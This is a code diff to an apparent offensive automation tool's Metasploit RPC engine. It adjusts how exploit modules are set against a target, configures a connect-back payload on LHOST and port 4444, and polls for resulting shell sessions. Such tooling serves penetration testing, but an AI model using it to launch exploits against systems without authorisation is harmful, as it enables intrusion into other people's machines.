@@ -201,16 +201,18 @@ class MetasploitRPCEngine:
             exploit = self.client.modules.use('exploit', custom_mod)
 
             # Apply options securely checking if the module requires them
-            exploit['RHOSTS'] = target
+            if 'RHOSTS' in exploit.options:
+                exploit['RHOSTS'] = target
+            elif 'RHOST' in exploit.options:
+                exploit['RHOST'] = target
+
             if 'RPORT' in exploit.options:
                 exploit['RPORT'] = rport
 
-            # By forcing RunAsJob, we ensure the RPC client doesn't tear down the listener
+            # Do not force RunAsJob; let MSF decide natively so command shells hook properly.
             payload_opts = {
                 'LHOST': lhost,
-                'LPORT': 4444,
-                'DisablePayloadHandler': False,
-                'RunAsJob': True
+                'LPORT': 4444
             }
 
             job = exploit.execute(payload=custom_payload, **payload_opts)
@@ -221,20 +223,30 @@ class MetasploitRPCEngine:
                     f"[bold green][+] Exploit launched successfully (Job ID: {job['job_id']})[/bold green]")
                 db.log("MSF-Engine", target,
                        f"Launched {custom_mod} via RPC", "HIGH")
+            elif isinstance(job, dict) and job.get('uuid'):
+                console.print(
+                    f"[bold green][+] Exploit executed successfully (Foreground).[/bold green]")
+                db.log("MSF-Engine", target,
+                       f"Launched {custom_mod} via RPC", "HIGH")
             else:
                 console.print(
                     f"[yellow][+] Exploit executed, response: {job}[/yellow]")
 
-            # Wait a few seconds for the payload to trigger and connect back
+            # Smart Wait Loop for Session Hooking (Polls every 2 seconds for 10 seconds)
             with console.status("[bold cyan]Waiting for session to establish...[/bold cyan]", spinner="bouncingBar"):
-                time.sleep(5)
-                sessions = self.client.sessions.list
-                if sessions:
+                session_found = False
+                for _ in range(5):
+                    time.sleep(2)
+                    sessions = self.client.sessions.list
+                    if sessions:
+                        console.print(
+                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. Use Option 3 to interact.[/bold green]")
+                        session_found = True
+                        break
+
+                if not session_found:
                     console.print(
-                        f"[bold green][+] Success! {len(sessions)} session(s) active.[/bold green]")
-                else:
-                    console.print(
-                        "[yellow][-] No session established yet. The target might not be vulnerable, or it needs more time.[/yellow]")
+                        "\n[yellow][-] No session established yet. The target might not be vulnerable, or it needs more time.[/yellow]")
 
         except Exception as e:
             console.print(
